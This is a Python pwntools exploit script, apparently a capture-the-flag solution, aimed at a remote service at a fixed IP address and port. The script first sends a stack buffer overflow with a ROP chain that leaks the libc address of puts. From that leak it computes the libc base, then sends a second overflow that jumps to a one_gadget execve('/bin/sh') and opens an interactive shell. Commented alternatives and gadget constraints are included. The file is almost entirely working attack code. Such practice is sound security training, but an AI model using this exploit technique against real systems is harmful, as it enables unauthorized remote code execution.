from pwn import *
from LibcSearcher import *

libc = ELF("./libc-2.27.so")

io = remote("182.116.62.85", 21613)

pop_rdi = 0x400743
puts_plt = 0x400520
puts_got = 0x601018
main = 0x40066B
payload = "a"*(64 + 8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
io.recvuntil("Do you know how to do buffer overflow?\n")
io.sendline(payload)

io.recvuntil("I hope you win\n")
addr = u64(io.recvuntil("\n")[:-1].ljust(8, "\x00"))
print(hex(addr))

# libc = LibcSearcher("puts", addr)
# base = addr - libc.dump("puts")
# system = base + libc.dump("system")
# binsh = base + libc.dump("str_bin_sh")

base = addr - libc.symbols["puts"]
system = base + libc.symbols["system"]
binsh = base + libc.search("/bin/sh").next()
one_gadget = [base + 0x4f3d5, base + 0x4f432, base + 0x10a41c]
# print(hex(binsh))
# payload = "a"*(64 + 8) + p64(pop_rdi) + p64(binsh) + p64(system) + p64(main)
payload = "a"*(64 + 8) + p64(one_gadget[1])
io.recvuntil("Do you know how to do buffer overflow?\n")
io.sendline(payload)

'''
0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''

io.interactive()
